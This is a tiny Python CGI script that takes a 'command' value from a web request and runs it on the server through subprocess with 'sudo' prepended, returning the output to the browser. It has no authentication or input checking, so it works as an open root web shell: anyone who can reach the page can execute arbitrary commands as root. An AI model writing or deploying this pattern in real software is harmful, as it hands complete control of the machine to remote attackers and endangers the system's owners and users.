#! /usr/bin/python3

import subprocess as sp
import cgi

print("content-type: text/html")
print()


fs = cgi.FieldStorage()
cmd = fs.getvalue('command')

output = sp.getoutput('sudo ' + cmd)

print(output)
